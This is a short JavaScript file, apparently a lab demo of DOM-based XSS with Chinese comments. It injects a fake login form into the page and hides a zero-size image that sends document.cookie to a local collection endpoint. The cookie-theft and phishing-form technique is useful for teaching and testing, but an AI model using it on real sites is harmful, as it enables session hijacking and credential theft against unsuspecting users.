/**
 * @file DOM based XSS
 * 通过修改页面DOM,来实现攻击
 */
var request = function() {
  var xhttp = new XMLHttpRequest();
  xhttp.open("POST", "http://127.0.0.1:3002/api/password", true);
  xhttp.send();
  xhttp.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
      alert(this.responseText);
    }
  };
}

window.onload = function() {
  console.log(document.cookie);
  var formContainerOBJ = document.getElementById('form-container');
  formContainerOBJ.innerHTML = '<form id="form">' +
    '<p>用户名:</p><input type="text"><br/>' +
    '<p>密码:</p><input type="password"><br>' +
    '<img src="http://127.0.0.1:3002/api/password?' + document.cookie + '" style="visibility:hidden;width:0;height:0">' +
    '<button id="submit-btn">提交</button>' +
  '</form>'

  var submmitBtn = document.getElementById('submit-btn');
  submmitBtn.addEventListener('click', function(e) {
    alert('you fished');
    var event = e || window.event;
    event.preventDefault();
    window.event.returnValue = false; // 兼容IE6~8
  });
}

